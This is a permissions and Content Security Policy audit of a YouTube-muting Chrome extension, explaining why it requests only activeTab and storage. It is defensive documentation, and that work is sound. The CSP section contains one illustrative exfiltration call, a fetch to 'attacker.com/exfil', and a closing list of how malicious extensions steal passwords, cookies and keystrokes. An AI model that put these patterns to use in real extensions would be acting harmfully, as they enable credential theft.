# Permissions Audit

Security review of every permission declared in `manifest.json` against the Principle of Least Privilege (PoLP).

---

## Declared Permissions

### `activeTab`

**What it grants:** Temporary access to the currently active tab — only when the user invokes the extension (clicks the popup or a keyboard shortcut). Access is revoked as soon as the tab navigates or the extension stops running.

**Why it's needed:** The popup sends messages (`chrome.tabs.sendMessage`) to the content script to trigger manual skip/mute actions and query enabled state. Without `activeTab`, there is no narrow way to route messages to the currently active tab after a user gesture.

**Abuse scenario:** An extension requesting `tabs` (broad, persistent) instead of `activeTab` can enumerate all open tabs, read their URLs, and track browsing history continuously. `activeTab` grants none of that.

**Mitigation:** `activeTab` is the narrowest possible tab permission. Access is user-gesture-gated and ephemeral.

---

### `storage`

**What it grants:** Read/write access to `chrome.storage.local` — a sandboxed key-value store isolated to this extension. No other extension or web page can access it.

**Why it's needed:** The telemetry monitor in `background.js` writes an audit log (up to 200 entries) of lifecycle events and any intercepted outbound fetch attempts. The popup reads this log to display the security audit dashboard.

**Abuse scenario:** Extensions commonly use `storage` to persist user data including browsing behavior, form inputs, or authentication tokens. A compromised extension with `storage` access could accumulate sensitive data across sessions.

**Mitigation:** Only two keys are written: `auditLog` (internal security log) and `enabled` (toggle state). No user-identifiable data is stored. The log contains only sanitized metadata (timestamps, event types, YouTube host/path context). Storage is never read by any third party — `connect-src 'none'` in the CSP makes exfiltration impossible.

---

## Permissions Not Requested (and Why)

| Permission | What It Would Enable | Why It's Absent |
|---|---|---|
| `tabs` | Enumerate all open tabs, read URLs | Not needed. `activeTab` covers popup→content messaging. |
| `webRequest` | Intercept and read all browser network traffic | Not needed. Extension makes no network calls. |
| `cookies` | Read/write cookies for any domain | Not needed. No authentication required. |
| `history` | Read full browsing history | Not needed. |
| `downloads` | Trigger file downloads | Not needed. |
| `<all_urls>` host permission | Run on every website | Not needed. Content script is scoped to `www.youtube.com`, `m.youtube.com`, and `music.youtube.com` only. |
| `identity` | OAuth token access | Not needed. |
| `nativeMessaging` | Communicate with native OS applications | Not needed. No local binary. |

---

## Content Security Policy

```
default-src 'self';
script-src 'self';
object-src 'none';
connect-src 'none';
style-src 'self';
img-src 'self' data:;
```

**`connect-src 'none'`** is the critical directive. It instructs the browser to block every outbound network connection from extension pages — XHR, fetch, WebSocket, EventSource. Even if an attacker injected JavaScript that called `fetch('https://attacker.com/exfil', ...)`, the browser would refuse the connection before any data left.

This eliminates the primary exfiltration vector for credential-stealing extensions.

**`script-src 'self'`** prevents inline script execution and blocks loading scripts from external URLs. Blocks XSS and CDN-based supply chain injection.

**`object-src 'none'`** prevents Flash and plugin execution.

---

## Threat Mitigated by This Audit

Browser extensions are one of the highest-privilege, least-audited attack surfaces in an enterprise environment. The Chrome Web Store review process does not catch all malicious behavior. A "legitimate" extension that requests broad permissions can:

1. Read passwords from `input[type="password"]` fields across every site
2. Exfiltrate session cookies via background `fetch` calls
3. Persist keystroke buffers in `storage.local` for later retrieval
4. Update silently via Chrome's auto-update mechanism with no user notification

This audit documents that Mute Tube does none of those things — and explains, at the code level, why it should not be able to. Run `npm test` after changes to validate the manifest, CSP, permission surface, and production-code privacy boundaries.
